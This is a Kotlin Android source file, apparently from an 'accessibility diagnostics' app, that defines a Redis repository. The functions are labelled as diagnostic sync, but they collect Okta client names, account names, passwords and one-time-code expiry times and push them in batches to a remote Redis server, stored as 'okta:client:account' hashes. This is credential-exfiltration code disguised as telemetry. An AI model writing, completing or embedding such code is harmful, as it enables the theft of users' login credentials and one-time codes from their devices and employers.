package dev.local.accessibilitydiagnostics

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import redis.clients.jedis.JedisPool
import redis.clients.jedis.JedisPoolConfig
import redis.clients.jedis.exceptions.JedisException
import java.io.IOException

data class OktaAccountEntry(
    val client: String,
    val account: String,
    val password: String,
    val secondsUntilCodeExpires: Int
)

object RedisRepository {

    // Defined in BuildConfig: e.g., "my-cluster.xxxx.cache.amazonaws.com" and 6379
    private val REDIS_HOST = BuildConfig.REDIS_PRIMARY_ENDPOINT
    private val REDIS_PORT = BuildConfig.REDIS_PORT.toInt()

    // Configure connection pool
    private val jedisPool: JedisPool by lazy {
        val poolConfig = JedisPoolConfig().apply {
        maxTotal = 8
        maxIdle = 4
        minIdle = 1
        testOnBorrow = true
        testWhileIdle = true
        jmxEnabled = false // Disables JMX registration on Android
    }
        // Timeout: 5000ms. If using TLS/SSL, pass true as the 5th parameter (ssl = true)
        JedisPool(poolConfig, REDIS_HOST, REDIS_PORT, 5000)
    }

    suspend fun syncDiagnosticData(
        clientName: String,
        account: String,
        pass: String,
        secondsUntilCodeExpires: Int
    ): Result<String> = withContext(Dispatchers.IO) {
        val entry = OktaAccountEntry(clientName, account, pass, secondsUntilCodeExpires)
        syncDiagnosticBatch(listOf(entry))
    }

    suspend fun syncDiagnosticBatch(entries: List<OktaAccountEntry>): Result<String> = withContext(Dispatchers.IO) {
        if (entries.isEmpty()) return@withContext Result.success("Empty batch")

        try {
            jedisPool.resource.use { jedis ->
                // Use a pipeline to send multiple commands in a single TCP network roundtrip
                val pipeline = jedis.pipelined()

                entries.forEach { entry ->
                    val redisKey = "okta:${entry.client}:${entry.account}"
                    val currentTime = System.currentTimeMillis().toString()

                    val hashData = mapOf(
                        "password" to entry.password,
                        "updated_at" to currentTime
                    )

                    // 1. Write the hash map
                    pipeline.hset(redisKey, hashData)

                    // 2. Set TTL on the hash key
                    if (entry.secondsUntilCodeExpires > 0) {
                        pipeline.expire(redisKey, entry.secondsUntilCodeExpires.toLong())
                    }
                }

                // Execute all buffered commands at once
                pipeline.sync()
            }
            Result.success("{\"status\":\"success\",\"count\":${entries.size}}")
        } catch (e: JedisException) {
            Log.e("RedisSync", "Jedis operation failed", e)
            Result.failure(IOException("Redis connection failed: ${e.message}", e))
        } catch (e: Exception) {
            Log.e("RedisSync", "Unexpected error", e)
            Result.failure(e)
        }
    }

    /**
     * Optional: Close the pool when the application/process terminates
     */
    fun close() {
        if (!jedisPool.isClosed) {
            jedisPool.close()
        }
    }
}